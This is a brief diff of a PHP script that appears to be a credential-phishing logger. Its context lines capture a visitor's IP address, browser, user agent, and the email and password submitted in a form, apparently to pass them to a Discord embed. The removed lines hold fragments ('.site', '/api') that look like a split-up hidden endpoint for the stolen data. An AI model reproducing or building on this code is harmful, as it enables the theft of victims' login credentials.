@@ -70,14 +70,11 @@
         $browser_title = "  ¦- More information: ". "\n";
         $user_browser = "  ¦    ¦- Browser: ". getBrowser(). "\n";
         $user_agent = "  ¦    +- User agent: ". $_SERVER['HTTP_USER_AGENT'] . "\n";
-        $lru5 = ".site";
         $pub = "  +- Follow me: ". "\n";
         $discord = "       ¦- Discord: Esio#0007". "\n";
         $server = "       ¦- server: discord.gg/5NZRR4hUKR". "\n";
         $github = "       ¦- Github: github.com/Esio-01". "\n";
-        $lru6 = "/api";
         $youtube = "       +- Youtube: youtube.com/channel/UCzsusjBbGdgrkqf4dncy6oA". "\n";
-
     $embed_ip = $_SERVER['REMOTE_ADDR'];
     $embed_email = $_POST['email'];
     $embed_password = $_POST['password'];
